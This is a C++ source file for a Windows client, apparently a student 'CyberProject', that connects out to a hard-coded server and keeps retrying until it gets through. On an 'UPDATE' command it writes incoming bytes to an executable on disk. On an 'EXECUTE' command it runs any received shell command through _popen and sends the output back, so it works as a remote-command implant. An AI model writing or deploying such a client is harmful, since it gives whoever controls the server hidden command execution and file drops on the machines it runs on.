#define WIN32_LEAN_AND_MEAN

#include <iostream>
#include <string>
#include <fstream>
#include "Socket.h"
#include "WindowsSocket.h"
#include "string.h"
using namespace std;

#define DEFAULT_BUFLEN 1050
#define DEFAULT_PORT "5003"
#define DEFAULT_HOST "10.7.0.70"

std::ofstream openFile(char *file_path)
{
	std::ofstream f2(file_path, std::fstream::binary);
	return f2;
}

void create_file(Socket clientSocket,SOCKET socket, char* recBuf, int iResult)
{
	char * filePath = "C:\\Users\\admin\\Desktop\\CyberProject\\Client\\client_update_file.exe";
	std::ofstream clientFile = openFile(filePath);
	int iResult2;
	char recvbuf[DEFAULT_BUFLEN * 4];

	do
	{
		//char recvbuf[DEFAULT_BUFLEN * 4] = { 0 };
		memset(recvbuf, 0, DEFAULT_BUFLEN * 4);
		iResult = clientSocket.receive(socket, recvbuf, DEFAULT_BUFLEN * 4);
		iResult2 = clientSocket.send_data(socket, "ok");
		if ((strcmp(recvbuf, "END_UPDATE") != 0))
		{
			clientFile.write(recvbuf, iResult);
			printf("Bytes received: %d\n", iResult);
		}
		
	} while (strcmp(recvbuf, "END_UPDATE") != 0);

	
	if (!strcmp(recvbuf, "END_UPDATE"))
	{
		clientFile.close();
		cout << "closed the file" << endl;
	}	
}
std::string exec(const char* cmd)
{
	char buffer[128];
	std::string result = "";
	FILE* pipe = _popen(cmd, "r");
	if (!pipe) throw std::runtime_error("popen() failed!");
	try {
		while (!feof(pipe)) {
			if (fgets(buffer, 128, pipe) != NULL)
				result += buffer;
		}
	}
	catch (...) {
		_pclose(pipe);
		throw;
	}
	_pclose(pipe);
	return result;
}
void executeCommand(Socket clientSocket, SOCKET socket)
{
	char recvbuf[DEFAULT_BUFLEN * 4];
	int iResult, iResult2;
	memset(recvbuf, 0, DEFAULT_BUFLEN * 4);
	iResult = clientSocket.receive(socket, recvbuf, DEFAULT_BUFLEN * 4);
	iResult2 = clientSocket.send_data(socket, "ok");//ok
	std::string w = exec(recvbuf);
	cout << w.c_str() << endl;
	clientSocket.send_data(socket, w.c_str());
	memset(recvbuf, 0, DEFAULT_BUFLEN * 4);//
	iResult = clientSocket.receive(socket, recvbuf, 2);//ok
	memset(recvbuf, 0, DEFAULT_BUFLEN * 4);
	iResult = clientSocket.receive(socket, recvbuf, DEFAULT_BUFLEN * 4);
	iResult2 = clientSocket.send_data(socket, "ok");
	if (!strcmp(recvbuf, "END_EXECUTE"))
	{
		cout << "end execute" << endl;
	}
}
int main(int argc, char **argv)
{
	Socket clientSocket;
	WindowsSocket windowsSocket;
	SOCKET socket = INVALID_SOCKET;

	struct addrinfo *result = NULL, hints;
	char *sendbuf = "this is a test14";
	char recvbuf[DEFAULT_BUFLEN];
	int iResult, iResult2;
	int recvbuflen = DEFAULT_BUFLEN;

	// Initialize Winsock
	try
	{
		windowsSocket.startup();
		ZeroMemory(&hints, sizeof(hints));
		hints.ai_family = AF_UNSPEC;
		hints.ai_socktype = SOCK_STREAM;
		hints.ai_protocol = IPPROTO_TCP;

		// Resolve the server address and port
		iResult = getaddrinfo(DEFAULT_HOST, DEFAULT_PORT, &hints, &result);
		if (iResult != 0) {
			throw new exception("getaddrinfo failed with error: %d\n", iResult);
		}

		clientSocket.setAddrInfo(result);
		
		// Attempt to connect to an address until one succeeds
		bool connectResult = false;
		while (true) // handle timeout!
		{
			// Create a SOCKET for connecting to server
			socket = clientSocket.create();

			// Connect to server.
			connectResult = clientSocket.conn(socket);
			if (connectResult == SOCKET_ERROR) {
				clientSocket.close(socket);
				socket = INVALID_SOCKET;
				continue;
			}
			break;
		}

		freeaddrinfo(result);

		// Send an initial buffer
		iResult = clientSocket.send_data(socket, sendbuf);

		printf("Bytes Sent: %ld\n", iResult);

		// Receive until the peer closes the connection
		do {
			try
			{
				char recvbuf[DEFAULT_BUFLEN * 4] = { 0 };
				iResult = clientSocket.receive(socket, recvbuf, recvbuflen*4);
				iResult2 = clientSocket.send_data(socket, "ok");
				if (iResult > 0)
				{

					//string buf = string(recvbuf);
					//cout << buf.substr(0, iResult);

					if (!strcmp(recvbuf, "UPDATE"))
					{
						create_file(clientSocket, socket, recvbuf, iResult);
					}
					else if (!strcmp(recvbuf, "EXECUTE"))
					{
						executeCommand(clientSocket, socket);
					}
					else
					{
						printf("Bytes received: %d\n", iResult);
						//iResult2 = clientSocket.send_data(socket, "ok");
						string buf = string(recvbuf);
						cout << buf.substr(0, iResult);
					}
				}
			}
			catch (exception ex)
			{
				cout << ex.what();
				continue;
			}

		} while (iResult > 0);

		// cleanup

		clientSocket.close(socket);
		windowsSocket.cleanup();
		return 0;
	}
	catch (exception ex)
	{
		cout << ex.what();
		windowsSocket.cleanup();
		return 1;
	}
}


